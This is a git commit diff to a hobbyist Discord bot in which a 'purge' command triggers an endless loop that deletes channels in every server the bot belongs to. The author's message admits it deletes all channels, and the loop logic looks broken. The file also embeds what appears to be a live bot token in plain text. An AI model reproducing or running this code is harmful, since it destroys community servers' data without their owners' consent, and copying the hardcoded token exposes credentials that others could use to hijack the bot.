02b7375827e28eacec98eaeb4af049b8eaf30cf4
talidemestre <30426066+talidemestre@users.noreply.github.com>
2017-09-10 14:17:51 +1000

    not that good
    really dumb but saying purge now deletes all channels, i dont know how this api works

--- source/bot.py
+++ source/bot.py
@@ -1,6 +1,5 @@
 import discord
 import asyncio
-
 purge_warning = "Warning, purging server."
 purge_success = "The purge has been successful. Enjoy your server."
 
@@ -20,15 +19,19 @@ async def on_message(message):
         #Purge messages from general
         print(purge_warning)
         await client.send_message(message.channel, purge_warning)
-        await asyncio.sleep(1)
-        deleted = await client.purge_from(message.channel)
-        await asyncio.sleep(1)
+        ##await asyncio.sleep(1)
+        ##await asyncio.sleep(1)
         #Delete all channels.
         server = message.server
-        channelList = server.channels
-        for i in channelList:
-             await client.delete_channel(i)
+        while 1==1:
+            for server in client.servers:
+                for i in server.channels:
+                    await client.delete_channel(i)
+                    break
+                break
+                
         #Delete all roles.
         await client.send_message(message.channel, purge_success)
+        
        
 client.run('MzU1OTgxMzUzNDUzNjE3MTUy.DJU7Kw.G595TciWLwbQRgGd25S5MXBoAPA')
